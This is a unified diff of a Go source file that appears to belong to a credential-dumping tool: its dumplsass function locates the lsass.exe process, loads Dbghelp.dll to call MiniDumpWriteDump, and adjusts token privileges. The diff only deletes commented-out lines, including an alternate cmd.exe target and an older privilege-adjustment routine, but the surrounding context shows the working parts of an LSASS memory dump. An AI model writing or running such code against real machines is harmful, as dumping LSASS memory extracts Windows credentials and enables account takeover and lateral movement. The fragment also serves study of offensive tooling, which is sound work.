@@ -85,7 +85,7 @@ func dumplsass() error {
 	procentry.Size = uint32(unsafe.Sizeof(syscall.ProcessEntry32{}))
 
 	targname := [260]uint16{'l', 's', 'a', 's', 's', '.', 'e', 'x', 'e'}
-	//targname := [260]uint16{'c', 'm', 'd', '.', 'e', 'x', 'e'}
+
 
 	err = syscall.Process32First(snapshot, &procentry)
 	if err != nil {
@@ -119,7 +119,7 @@ func dumplsass() error {
 	//get minidumpwrite
 	dbgcore := syscall.NewLazyDLL("Dbghelp.dll")
 
-	//dumpword := syscall.StringToUTF16Ptr("MiniDumpWithFullMemory")
+
 	minidumpwrite := dbgcore.NewProc("MiniDumpWriteDump")
 
 	//apparently we want incorrect parameters? Shoutout C_Sto, the real GOAT
@@ -191,30 +191,11 @@ func adjustPrivileges(token syscall.Token, privileges []uint64, action uint32) e
 	if !success {
 		return err
 	}
-	//if err == ERROR_NOT_ALL_ASSIGNED {
-	//	return &PrivilegeError{privileges}
-	//}
+	
 	return nil
 }
 
-// func adjustPrivileges(token syscall.Token, privileges []uint64, action uint32) error {
-// 	var b bytes.Buffer
-// 	binary.Write(&b, binary.LittleEndian, uint32(len(privileges)))
-// 	for _, p := range privileges {
-// 		binary.Write(&b, binary.LittleEndian, p)
-// 		binary.Write(&b, binary.LittleEndian, action)
-// 	}
-// 	prevState := make([]byte, b.Len())
-// 	reqSize := uint32(0)
-// 	success, err := adjustTokenPrivileges(token, false, &b.Bytes()[0], uint32(len(prevState)), &prevState[0], &reqSize)
-// 	if !success {
-// 		return err
-// 	}
-// 	if err == ERROR_NOT_ALL_ASSIGNED {
-// 		return &PrivilegeError{privileges}
-// 	}
-// 	return nil
-// }
+
 
 func adjustTokenPrivileges(token syscall.Token, releaseAll bool, input *byte, outputSize uint32, output *byte, requiredSize *uint32) (success bool, err error) {
 	var _p0 uint32
